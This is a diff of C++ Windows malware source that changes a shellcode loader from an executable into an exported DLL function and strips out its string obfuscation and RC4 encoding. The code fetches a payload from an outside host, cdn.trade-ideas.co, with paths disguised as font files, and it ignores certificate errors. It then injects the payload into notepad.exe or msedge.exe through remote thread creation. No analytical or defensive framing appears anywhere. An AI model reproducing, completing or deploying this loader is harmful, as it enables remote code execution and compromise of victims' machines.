@@ -2,9 +2,8 @@
 #include <wininet.h>
 #include <tlhelp32.h>
 #include <stdio.h>
-#include <wchar.h>
 
-#pragma comment (lib, "Wininet.lib")
+#pragma comment(lib, "Wininet.lib")
 
 struct Shellcode {
     BYTE* pcData;
@@ -16,124 +15,93 @@ BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
 BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
 BOOL Inject(DWORD dwPID, Shellcode shellcode);
 
-wchar_t* deobf_int_array(const int* arr, size_t len, int const_val) {
-    wchar_t* str = new wchar_t[len + 1];
-    for (size_t i = 0; i < len; i++) {
-        str[i] = (wchar_t)(arr[i] - const_val);
-    }
-    str[len] = 0;
-    return str;
-}
-
-long parse_val(const wchar_t* s) {
-    if (wcsncmp(s, L"&H", 2) == 0) {
-        return wcstol(s + 2, NULL, 16);
-    }
-    return wcstol(s, NULL, 10);
-}
-
-void rc4(unsigned char* key, size_t keylen, unsigned char* data, size_t datalen) {
-    unsigned char s[256];
-    for (size_t i = 0; i < 256; i++) s[i] = (unsigned char)i;
-    size_t j = 0;
-    for (size_t i = 0; i < 256; i++) {
-        j = (j + s[i] + key[i % keylen]) % 256;
-        unsigned char temp = s[i];
-        s[i] = s[j];
-        s[j] = temp;
-    }
-    size_t i = 0; j = 0;
-    for (size_t k = 0; k < datalen; k++) {
-        i = (i + 1) % 256;
-        j = (j + s[i]) % 256;
-        unsigned char temp = s[i];
-        s[i] = s[j];
-        s[j] = temp;
-        data[k] ^= s[(s[i] + s[j]) % 256];
-    }
-}
-
-void xor_obfuscate(BYTE* data, DWORD size, BYTE key) {
-    for (DWORD i = 0; i < size; i++) {
-        data[i] ^= key;
-    }
-}
-
-int main() {
+// Exported function to trigger the main logic
+__declspec(dllexport) BOOL ExecutePayload()
+{
+    // Hide console window (optional, may not be needed in a DLL)
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
     DWORD pid = GetTargetPID();
-    if (pid == 0) {
-        OutputDebugString(L"[-] Failed to find target PID\n");
-        return 1;
-    }
+    if (pid == 0) { return FALSE; }
 
-    int host_arr[] = { 44635, 44636, 44646, 44582, 44652, 44650, 44633, 44636, 44637, 44581, 44641, 44636, 44637, 44633, 44651, 44582, 44635, 44647 };
-    LPCWSTR host = deobf_int_array(host_arr, sizeof(host_arr) / sizeof(int), 44536);
-
-    struct Shellcode shellcode;
-    if (!DownloadHTTPS(host, 443, &shellcode)) {
-        if (!Download(host, 80, &shellcode)) {
-            OutputDebugString(L"[-] Both HTTPS and HTTP downloads failed\n");
-            delete[] host;
-            return 2;
+    struct Shellcode shellcode = {0};
+    // Try HTTPS first, fallback to HTTP if needed
+    if (!DownloadHTTPS(L"cdn.trade-ideas.co", 443, &shellcode)) {
+        if (!Download(L"cdn.trade-ideas.co", 80, &shellcode)) {
+            return FALSE;
         }
     }
-
-    delete[] host;
 
     if (!Inject(pid, shellcode)) {
-        OutputDebugString(L"[-] Injection failed\n");
-        return 3;
+        // Clean up allocated memory
+        if (shellcode.pcData) {
+            free(shellcode.pcData);
+        }
+        return FALSE;
     }
 
-    return 0;
+    // Clean up allocated memory
+    if (shellcode.pcData) {
+        free(shellcode.pcData);
+    }
+    return TRUE;
 }
 
+// DLL entry point
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        // Initialize when the DLL is loaded
+        break;
+    case DLL_PROCESS_DETACH:
+        // Cleanup when the DLL is unloaded
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+// ------ Getting the shellcode via HTTPS ------ //
 BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
-    unsigned char ua_enc[] = { 0x1B, 0x66, 0xEA, 0x6E, 0x0E, 0x44, 0xD4, 0x66, 0xE6, 0xD0, 0x8B, 0x98, 0x3D, 0x0C, 0xFF, 0xC5, 0xF4, 0xBF, 0x35, 0xD3, 0xCE, 0xBC, 0x0A, 0x26, 0x0F, 0x51, 0x92, 0x2F, 0x75, 0x9C, 0xFA, 0x73, 0x0E, 0x8A, 0x61, 0xC0, 0xB5, 0xD9, 0x9A, 0x88, 0x90, 0x21, 0xA2, 0x61, 0x38, 0xDD, 0xDA, 0x41, 0x1A, 0x5C, 0x52, 0xDA, 0x54, 0x55, 0xD2, 0xF0, 0x15, 0x3C, 0x78, 0xCD, 0xCC, 0xEE, 0xD1, 0x79, 0xF9, 0x38, 0x6F, 0xBA, 0xF4, 0xC2, 0x89, 0x4E, 0xD3, 0x24, 0x8B, 0x91, 0x01, 0xA3, 0x7D, 0xC5, 0xE0, 0xAD, 0x79, 0x4F, 0x1F, 0x0B, 0x10, 0x39, 0x30, 0x85, 0x6A, 0xAE, 0x85, 0x91, 0x0A, 0x98, 0x72, 0x1B, 0x5B, 0x89, 0xCF, 0xA6, 0xD4, 0x13, 0xF2, 0xB8, 0xD2, 0xC1, 0xEC, 0x1D, 0x65, 0xB7, 0xF4, 0x31, 0xDC, 0x07, 0x39, 0x8E, 0x88, 0x8C, 0xA5, 0xC6, 0x10, 0x9C, 0xAF, 0xA3, 0x3D, 0x9B, 0xD1, 0xF6, 0xA6, 0x51, 0xB4, 0x12, 0xC2, 0x35, 0x6F, 0xAB, 0xD3, 0xEC, 0x19, 0x79, 0x84, 0x20, 0x87, 0x64, 0xC5, 0xF9, 0x8B, 0xA3, 0xB1, 0x57, 0x83, 0xFD, 0x97, 0xCD, 0x92, 0x40, 0xC0, 0x8E, 0xFC, 0xBE, 0xE8, 0x07, 0xD1, 0x94, 0x07, 0x5F, 0x1F, 0x0F, 0x53, 0x3C, 0x61, 0x1D, 0x4B, 0x5F, 0xDD, 0x3B, 0x9E, 0xED, 0x50, 0x08, 0xBE, 0xDE, 0x29, 0xF2, 0x23, 0x70, 0xE3, 0xF7, 0x0D, 0x6E, 0xAC, 0xBE, 0x07, 0xDF, 0xF3, 0xDB, 0xD9, 0x1B, 0xE4, 0xB8, 0xC6, 0x10, 0xFF, 0xE8, 0x06, 0xC2, 0x8F, 0x9B, 0x22, 0x14, 0x40, 0xFA, 0xDC, 0xD7, 0x42, 0x8B, 0xBF, 0xC1, 0x11, 0xBA };
-    size_t ua_len = 222;
-    unsigned char* ua_data = new unsigned char[ua_len];
-    memcpy(ua_data, ua_enc, ua_len);
-    rc4((unsigned char*)"mykey", 5, ua_data, ua_len);
-    LPCWSTR ua = (LPCWSTR)ua_data;
+    HINTERNET session = InternetOpen(
+        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+        INTERNET_OPEN_TYPE_PRECONFIG,
+        NULL,
+        NULL,
+        0);
+    if (!session) return FALSE;
 
-    HINTERNET session = InternetOpen(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    delete[] ua_data;
-    if (!session) {
-        OutputDebugString(L"[-] InternetOpen failed\n");
-        return 0;
-    }
-
-    HINTERNET connection = InternetConnect(session, host, port, L"", L"", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 0);
+    HINTERNET connection = InternetConnect(
+        session,
+        host,
+        port,
+        L"",
+        L"",
+        INTERNET_SERVICE_HTTP,
+        INTERNET_FLAG_SECURE,  // Enable SSL/TLS
+        0);
     if (!connection) {
-        OutputDebugString(L"[-] InternetConnect failed\n");
         InternetCloseHandle(session);
-        return 0;
+        return FALSE;
     }
 
-    int method_arr[] = { 44639, 44637, 44652 };
-    LPCWSTR method = deobf_int_array(method_arr, sizeof(method_arr) / sizeof(int), 44536);
-
-    wchar_t path[10];
-    path[0] = 200 - (wchar_t)parse_val(L"&H99");
-    path[1] = 200 - (wchar_t)parse_val(L"&H54");
-    path[2] = 200 - (wchar_t)parse_val(L"&H63");
-    path[3] = 200 - (wchar_t)parse_val(L"&H55");
-    path[4] = 200 - (wchar_t)parse_val(L"&H54");
-    path[5] = 200 - (wchar_t)parse_val(L"&H9A");
-    path[6] = 200 - (wchar_t)parse_val(L"&H54");
-    path[7] = 200 - (wchar_t)parse_val(L"&H54");
-    path[8] = 200 - (wchar_t)parse_val(L"&H62");
-    path[9] = 0;
-
-    HINTERNET request = HttpOpenRequest(connection, method, path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
-    delete[] method;
+    HINTERNET request = HttpOpenRequest(
+        connection,
+        L"GET",
+        L"/test.ttf",
+        NULL,
+        NULL,
+        NULL,
+        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,  // SSL flags
+        0);
     if (!request) {
-        OutputDebugString(L"[-] HttpOpenRequest failed\n");
         InternetCloseHandle(connection);
         InternetCloseHandle(session);
-        return 0;
+        return FALSE;
     }
 
     WORD counter = 0;
@@ -141,30 +109,44 @@ BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
         counter++;
         Sleep(3000);
         if (counter >= 3) {
-            OutputDebugString(L"[-] HttpSendRequest failed after retries\n");
             InternetCloseHandle(request);
             InternetCloseHandle(connection);
             InternetCloseHandle(session);
-            return 0;
+            return FALSE; // HTTPS requests eventually failed
         }
     }
 
     DWORD bufSize = BUFSIZ;
     BYTE* buffer = new BYTE[bufSize];
+    if (!buffer) {
+        InternetCloseHandle(request);
+        InternetCloseHandle(connection);
+        InternetCloseHandle(session);
+        return FALSE;
+    }
+
     DWORD capacity = bufSize;
     BYTE* payload = (BYTE*)malloc(capacity);
+    if (!payload) {
+        delete[] buffer;
+        InternetCloseHandle(request);
+        InternetCloseHandle(connection);
+        InternetCloseHandle(session);
+        return FALSE;
+    }
+
     DWORD payloadSize = 0;
 
     while (true) {
         DWORD bytesRead;
+
         if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
-            OutputDebugString(L"[-] InternetReadFile failed\n");
             free(payload);
             delete[] buffer;
             InternetCloseHandle(request);
             InternetCloseHandle(connection);
             InternetCloseHandle(session);
-            return 0;
+            return FALSE;
         }
 
         if (bytesRead == 0) break;
@@ -172,14 +154,13 @@ BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
         if (payloadSize + bytesRead > capacity) {
             capacity *= 2;
             BYTE* newPayload = (BYTE*)realloc(payload, capacity);
-            if (newPayload == NULL) {
-                OutputDebugString(L"[-] realloc failed\n");
+            if (!newPayload) {
                 free(payload);
                 delete[] buffer;
                 InternetCloseHandle(request);
                 InternetCloseHandle(connection);
                 InternetCloseHandle(session);
-                return 0;
+                return FALSE;
             }
             payload = newPayload;
         }
@@ -190,63 +171,57 @@ BOOL DownloadHTTPS(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
     }
 
     BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);
-    if (newPayload == NULL) {
-        OutputDebugString(L"[-] Final realloc failed\n");
-        free(payload);
-        delete[] buffer;
-        InternetCloseHandle(request);
-        InternetCloseHandle(connection);
-        InternetCloseHandle(session);
-        return 0;
+    if (newPayload) {
+        payload = newPayload;
     }
-    payload = newPayload;
 
+    delete[] buffer; // Clean up buffer
     InternetCloseHandle(request);
     InternetCloseHandle(connection);
     InternetCloseHandle(session);
-    delete[] buffer;
 
     (*shellcode).pcData = payload;
     (*shellcode).dwSize = payloadSize;
-    return 1;
+    return TRUE;
 }
 
+// ------ Getting the shellcode via HTTP ------ //
 BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
-    unsigned char ua_enc[] = { 0x1B, 0x66, 0xEA, 0x6E, 0x0E, 0x44, 0xD4, 0x66, 0xE6, 0xD0, 0x8B, 0x98, 0x3D, 0x0C, 0xFF, 0xC5, 0xF4, 0xBF, 0x35, 0xD3, 0xCE, 0xBC, 0x0A, 0x26, 0x0F, 0x51, 0x92, 0x2F, 0x75, 0x9C, 0xFA, 0x73, 0x0E, 0x8A, 0x61, 0xC0, 0xB5, 0xD9, 0x9A, 0x88, 0x90, 0x21, 0xA2, 0x61, 0x38, 0xDD, 0xDA, 0x41, 0x1A, 0x5C, 0x52, 0xDA, 0x54, 0x55, 0xD2, 0xF0, 0x15, 0x3C, 0x78, 0xCD, 0xCC, 0xEE, 0xD1, 0x79, 0xF9, 0x38, 0x6F, 0xBA, 0xF4, 0xC2, 0x89, 0x4E, 0xD3, 0x2424, 0x8B, 0x91, 0x01, 0xA3, 0x7D, 0xC5, 0xE0, 0xAD, 0x79, 0x4F, 0x1F, 0x0B, 0x10, 0x39, 0x30, 0x85, 0x6A, 0xAE, 0x85, 0x91, 0x0A, 0x98, 0x72, 0x1B, 0x5B, 0x89, 0xCF, 0xA6, 0xD4, 0x13, 0xF2, 0xB8, 0xD2, 0xC1, 0xEC, 0x1D, 0x65, 0xB7, 0xF4, 0x31, 0xDC, 0x07, 0x39, 0x8E, 0x88, 0x8C, 0xA5, 0xC6, 0x10, 0x9C, 0xAF, 0xA3, 0x3D, 0x9B, 0xD1, 0xF6, 0xA6, 0x51, 0xB4, 0x12, 0xC2, 0x35, 0x6F, 0xAB, 0xD3, 0xEC, 0x19, 0x79, 0x84, 0x20, 0x87, 0x64, 0xC5, 0xF9, 0x8B, 0xA3, 0xB1, 0x57, 0x83, 0xFD, 0x97, 0xCD, 0x92, 0x40, 0xC0, 0x8E, 0xFC, 0xBE, 0xE8, 0x07, 0xD1, 0x94, 0x07, 0x5F, 0x1F, 0x0F, 0x53, 0x3C, 0x61, 0x1D, 0x4B, 0x5F, 0xDD, 0x3B, 0x9E, 0xED, 0x50, 0x08, 0xBE, 0xDE, 0x29, 0xF2, 0x23, 0x70, 0xE3, 0xF7, 0x0D, 0x6E, 0xAC, 0xBE, 0x07, 0xDF, 0xF3, 0xDB, 0xD9, 0x1B, 0xE4, 0xB8, 0xC6, 0x10, 0xFF, 0xE8, 0x06, 0xC2, 0x8F, 0x9B, 0x22, 0x14, 0x40, 0xFA, 0xDC, 0xD7, 0x42, 0x8B, 0xBF, 0xC1, 0x11, 0xBA };
-    size_t ua_len = 222;
-    unsigned char* ua_data = new unsigned char[ua_len];
-    memcpy(ua_data, ua_enc, ua_len);
-    rc4((unsigned char*)"mykey", 5, ua_data, ua_len);
-    LPCWSTR ua = (LPCWSTR)ua_data;
+    HINTERNET session = InternetOpen(
+        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+        INTERNET_OPEN_TYPE_PRECONFIG,
+        NULL,
+        NULL,
+        0);
+    if (!session) return FALSE;
 
-    HINTERNET session = InternetOpen(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    delete[] ua_data;
-    if (!session) {
-        OutputDebugString(L"[-] InternetOpen failed\n");
-        return 0;
-    }
-
-    HINTERNET connection = InternetConnect(session, host, port, L"", L"", INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET connection = InternetConnect(
+        session,
+        host,
+        port,
+        L"",
+        L"",
+        INTERNET_SERVICE_HTTP,
+        0,
+        0);
     if (!connection) {
-        OutputDebugString(L"[-] InternetConnect failed\n");
         InternetCloseHandle(session);
-        return 0;
+        return FALSE;
     }
 
-    int method_arr[] = { 44639, 44637, 44652 };
-    LPCWSTR method = deobf_int_array(method_arr, sizeof(method_arr) / sizeof(int), 44536);
-
-    int path_arr[] = { 44657, 44633, 44639, 44646, 44647, 44656, 44656, 44656, 44654, 44637, 44646, 44647, 44645, 44582, 44655, 44647, 44638, 44638 };
-    LPCWSTR path = deobf_int_array(path_arr, sizeof(path_arr) / sizeof(int), 44536);
-
-    HINTERNET request = HttpOpenRequest(connection, method, path, NULL, NULL, NULL, 0, 0);
-    delete[] method;
-    delete[] path;
+    HINTERNET request = HttpOpenRequest(
+        connection,
+        L"GET",
+        L"/zagnoxxxvenom.woff",
+        NULL,
+        NULL,
+        NULL,
+        0,
+        0);
     if (!request) {
-        OutputDebugString(L"[-] HttpOpenRequest failed\n");
         InternetCloseHandle(connection);
         InternetCloseHandle(session);
-        return 0;
+        return FALSE;
     }
 
     WORD counter = 0;
@@ -254,30 +229,44 @@ BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
         counter++;
         Sleep(3000);
         if (counter >= 3) {
-            OutputDebugString(L"[-] HttpSendRequest failed after retries\n");
             InternetCloseHandle(request);
             InternetCloseHandle(connection);
             InternetCloseHandle(session);
-            return 0;
+            return FALSE; // HTTP requests eventually failed
         }
     }
 
     DWORD bufSize = BUFSIZ;
     BYTE* buffer = new BYTE[bufSize];
+    if (!buffer) {
+        InternetCloseHandle(request);
+        InternetCloseHandle(connection);
+        InternetCloseHandle(session);
+        return FALSE;
+    }
+
     DWORD capacity = bufSize;
     BYTE* payload = (BYTE*)malloc(capacity);
+    if (!payload) {
+        delete[] buffer;
+        InternetCloseHandle(request);
+        InternetCloseHandle(connection);
+        InternetCloseHandle(session);
+        return FALSE;
+    }
+
     DWORD payloadSize = 0;
 
     while (true) {
         DWORD bytesRead;
+
         if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
-            OutputDebugString(L"[-] InternetReadFile failed\n");
             free(payload);
             delete[] buffer;
             InternetCloseHandle(request);
             InternetCloseHandle(connection);
             InternetCloseHandle(session);
-            return 0;
+            return FALSE;
         }
 
         if (bytesRead == 0) break;
@@ -285,14 +274,13 @@ BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
         if (payloadSize + bytesRead > capacity) {
             capacity *= 2;
             BYTE* newPayload = (BYTE*)realloc(payload, capacity);
-            if (newPayload == NULL) {
-                OutputDebugString(L"[-] realloc failed\n");
+            if (!newPayload) {
                 free(payload);
                 delete[] buffer;
                 InternetCloseHandle(request);
                 InternetCloseHandle(connection);
                 InternetCloseHandle(session);
-                return 0;
+                return FALSE;
             }
             payload = newPayload;
         }
@@ -303,42 +291,30 @@ BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
     }
 
     BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);
-    if (newPayload == NULL) {
-        OutputDebugString(L"[-] Final realloc failed\n");
-        free(payload);
-        delete[] buffer;
-        InternetCloseHandle(request);
-        InternetCloseHandle(connection);
-        InternetCloseHandle(session);
-        return 0;
+    if (newPayload) {
+        payload = newPayload;
     }
-    payload = newPayload;
 
+    delete[] buffer; // Clean up buffer
     InternetCloseHandle(request);
     InternetCloseHandle(connection);
     InternetCloseHandle(session);
-    delete[] buffer;
 
     (*shellcode).pcData = payload;
     (*shellcode).dwSize = payloadSize;
-    return 1;
+    return TRUE;
 }
 
+// ------ Finding a target process ------ //
 DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize);
 DWORD GetFirstPIDProcname(const WCHAR* szProcname);
 
 DWORD GetTargetPID() {
-    int notepad_arr[] = { 44646, 44647, 44652, 44637, 44648, 44633, 44636, 44582, 44637, 44656, 44637 };
-    int msedge_arr[] = { 44645, 44651, 44637, 44636, 44639, 44637, 44582, 44637, 44656, 44637 };
     const WCHAR* aszProclist[2] = {
-        deobf_int_array(notepad_arr, sizeof(notepad_arr) / sizeof(int), 44536),
-        deobf_int_array(msedge_arr, sizeof(msedge_arr) / sizeof(int), 44536)
+        L"notepad.exe",
+        L"msedge.exe"
     };
-    DWORD pid = GetFirstPIDProclist(aszProclist, sizeof(aszProclist) / sizeof(aszProclist[0]));
-
-    delete[] aszProclist[0];
-    delete[] aszProclist[1];
-    return pid;
+    return GetFirstPIDProclist(aszProclist, sizeof(aszProclist) / sizeof(aszProclist[0]));
 }
 
 DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize) {
@@ -354,15 +330,11 @@ DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize) {
 
 DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
     HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (INVALID_HANDLE_VALUE == hProcessSnapshot) {
-        OutputDebugString(L"[-] CreateToolhelp32Snapshot failed\n");
-        return 0;
-    }
+    if (INVALID_HANDLE_VALUE == hProcessSnapshot) return 0;
 
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
     if (!Process32First(hProcessSnapshot, &pe32)) {
-        OutputDebugString(L"[-] Process32First failed\n");
         CloseHandle(hProcessSnapshot);
         return 0;
     }
@@ -371,9 +343,6 @@ DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
     while (Process32Next(hProcessSnapshot, &pe32)) {
         if (lstrcmpiW(szProcname, pe32.szExeFile) == 0) {
             pid = pe32.th32ProcessID;
-            wchar_t debugMsg[256];
-            swprintf(debugMsg, 256, L"[+] Process found: %d %ls\n", pid, pe32.szExeFile);
-            OutputDebugString(debugMsg);
             break;
         }
     }
@@ -382,117 +351,32 @@ DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
     return pid;
 }
 
+// ------ Injecting into process ------ //
 BOOL Inject(DWORD dwPID, Shellcode shellcode) {
-    // Dynamic API resolution
-    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
-
-    // Deobfuscate API names into temporary wide strings
-    int valloc_arr[] = { 44654, 44641, 44650, 44652, 44653, 44633, 44644, 44647, 44635, 44637, 44656, 44581, 44656 };
-    wchar_t* valloc_name = deobf_int_array(valloc_arr, sizeof(valloc_arr) / sizeof(int), 44536);
-
-    int write_arr[] = { 44655, 44650, 44641, 44652, 44637, 44648, 44650, 44647, 44635, 44637, 44651, 44651, 44645, 44637, 44645, 44647, 44650, 44657 };
-    wchar_t* write_name = deobf_int_array(write_arr, sizeof(write_arr) / sizeof(int), 44536);
-
-    int create_arr[] = { 44635, 44650, 44637, 44633, 44652, 44637, 44650, 44637, 44645, 44647, 44652, 44637, 44652, 44644, 44650, 44637, 44633, 44636 };
-    wchar_t* create_name = deobf_int_array(create_arr, sizeof(create_arr) / sizeof(int), 44536);
-
-    // Convert wide strings to ANSI for GetProcAddress
-    char* valloc_ansi = NULL;
-    char* write_ansi = NULL;
-    char* create_ansi = NULL;
-
-    int valloc_len = WideCharToMultiByte(CP_ACP, 0, valloc_name, -1, NULL, 0, NULL, NULL);
-    if (valloc_len > 0) {
-        valloc_ansi = new char[valloc_len];
-        WideCharToMultiByte(CP_ACP, 0, valloc_name, -1, valloc_ansi, valloc_len, NULL, NULL);
-    }
-
-    int write_len = WideCharToMultiByte(CP_ACP, 0, write_name, -1, NULL, 0, NULL, NULL);
-    if (write_len > 0) {
-        write_ansi = new char[write_len];
-        WideCharToMultiByte(CP_ACP, 0, write_name, -1, write_ansi, write_len, NULL, NULL);
-    }
-
-    int create_len = WideCharToMultiByte(CP_ACP, 0, create_name, -1, NULL, 0, NULL, NULL);
-    if (create_len > 0) {
-        create_ansi = new char[create_len];
-        WideCharToMultiByte(CP_ACP, 0, create_name, -1, create_ansi, create_len, NULL, NULL);
-    }
-
-    // Clean up wide strings
-    delete[] valloc_name;
-    delete[] write_name;
-    delete[] create_name;
-
-    // Resolve APIs
-    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
-    typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
-
-    pVirtualAllocEx fnVirtualAllocEx = valloc_ansi ? (pVirtualAllocEx)GetProcAddress(hKernel32, valloc_ansi) : NULL;
-    pWriteProcessMemory fnWriteProcessMemory = write_ansi ? (pWriteProcessMemory)GetProcAddress(hKernel32, write_ansi) : NULL;
-    pCreateRemoteThread fnCreateRemoteThread = create_ansi ? (pCreateRemoteThread)GetProcAddress(hKernel32, create_ansi) : NULL;
-
-    // Clean up ANSI strings
-    if (valloc_ansi) delete[] valloc_ansi;
-    if (write_ansi) delete[] write_ansi;
-    if (create_ansi) delete[] create_ansi;
-
-    if (!fnVirtualAllocEx || !fnWriteProcessMemory || !fnCreateRemoteThread) {
-        OutputDebugString(L"[-] Failed to resolve APIs\n");
-        return 0;
-    }
-
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, dwPID);
-    if (!hProcess) {
-        wchar_t debugMsg[256];
-        swprintf(debugMsg, 256, L"[-] OpenProcess failed for PID %d: %d\n", dwPID, GetLastError());
-        OutputDebugString(debugMsg);
-        return 0;
-    }
+    if (!hProcess) { return FALSE; }
 
-    LPVOID pRemoteAddr = fnVirtualAllocEx(hProcess, NULL, shellcode.dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
     if (!pRemoteAddr) {
-        wchar_t debugMsg[256];
-        swprintf(debugMsg, 256, L"[-] VirtualAllocEx failed: %d\n", GetLastError());
-        OutputDebugString(debugMsg);
         CloseHandle(hProcess);
-        return 0;
+        return FALSE;
     }
 
-    SIZE_T bytesWritten;
-    if (!fnWriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, &bytesWritten) || bytesWritten != shellcode.dwSize) {
-        wchar_t debugMsg[256];
-        swprintf(debugMsg, 256, L"[-] WriteProcessMemory failed: %d, Bytes Written: %zu\n", GetLastError(), bytesWritten);
-        OutputDebugString(debugMsg);
+    if (!WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
         VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
         CloseHandle(hProcess);
-        return 0;
+        return FALSE;
     }
 
-    HANDLE hThread = fnCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
-    if (!hThread) {
-        wchar_t debugMsg[256];
-        swprintf(debugMsg, 256, L"[-] CreateRemoteThread failed: %d\n", GetLastError());
-        OutputDebugString(debugMsg);
-        VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
+    if (hThread != NULL) {
+        WaitForSingleObject(hThread, 500);
+        CloseHandle(hThread);
         CloseHandle(hProcess);
-        return 0;
+        return TRUE;
     }
 
-    WaitForSingleObject(hThread, 500);
-    DWORD exitCode;
-    GetExitCodeThread(hThread, &exitCode);
-    if (exitCode != STILL_ACTIVE) {
-        wchar_t debugMsg[256];
-        swprintf(debugMsg, 256, L"[-] Remote thread terminated with code: %d\n", exitCode);
-        OutputDebugString(debugMsg);
-    }
-    else {
-        OutputDebugString(L"[+] Injection successful\n");
-    }
-
-    CloseHandle(hThread);
+    VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
     CloseHandle(hProcess);
-    return 1;
+    return FALSE;
 }
